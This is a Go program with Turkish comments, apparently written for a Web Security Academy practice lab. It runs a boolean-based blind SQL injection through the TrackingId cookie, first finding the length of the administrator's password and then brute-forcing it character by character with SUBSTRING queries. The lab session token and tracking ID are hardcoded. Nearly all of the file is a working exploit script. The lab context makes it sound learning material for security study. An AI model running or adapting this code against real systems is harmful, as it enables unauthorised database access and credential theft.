package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strconv"
	"strings"
)

var (
	url_       = "https://ac911f111e9de90ac0f56c9800de006c.web-security-academy.net/"
	keylist    = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	TrackingId = "tWNNK4IK3DprMvjh"
	session    = "ELhOUdfAAqGx7E50KQw9oefIIpW8aXKT"
)

func main() {
	pentest()
}

func pentest() {
	//SQL açığını tespit ettik
	// fmt.Println(sendReq("xyz' OR '1'='1"))

	//şifre uzunluğunu tespit ettik --> 20 karakter
	/*for i := 1; i < 30; i++ {
		res := sendReq("aaa' OR (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=" + strconv.Itoa(i) + ")='a")
		if res {
			fmt.Println(res)
			break
		}
	}*/

	//pass değişkeni 20 karakter oluncaya kadar devam eden bir döngü
	pass := ""
	for ok := true; ok; ok = (len(pass) != 20) {
		for _, c := range keylist {
			//pass değişkeni ve c değişkenini (yani tek tek keylist değerlerini pass değişkeni ile toplayarak) birleştirip gönderir
			//SUBSTRING fonksiyonu mysql de verilen parametrelere göre verilen stringi parçalar
			//burada SUBSTRING(password,1,1) için password değerinin ilk karakterinin değerini verir
			//ilk karakterin değeri yukarıdaki keylist içerisindeki bir değişken ile eşleşir ise devam eder
			//ikinci karakteri bulmak için ise SUBSTRING(password,1,2) olarak kullanılır ve password değerinin ilk iki karakterini çıktı olarak verir
			//bu şekilde devam eder
			res := sendReq("aaa' OR (SELECT SUBSTRING(password,1," + strconv.Itoa((len(pass) + 1)) + ") FROM users WHERE username='administrator')='" + pass + string(c) + "")
			//eğer true dönerse pass değişkenine c değerini atar ve iç for dan çıkar
			//bu işlemi pass değişkeni 20 karakter olana kadar tekrarlar
			if res {
				pass += string(c)
				fmt.Println("Success : " + pass)
				break
			}
		}
	}
}

func sendReq(payload string) bool {
	client := &http.Client{}
	req, _ := http.NewRequest("GET", url_, nil)

	req.Header.Add("Cookie", "TrackingId="+payload+";session="+session)

	res, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println(payload)
	return strings.Contains(string(body), "<div>Welcome back!</div>")

}
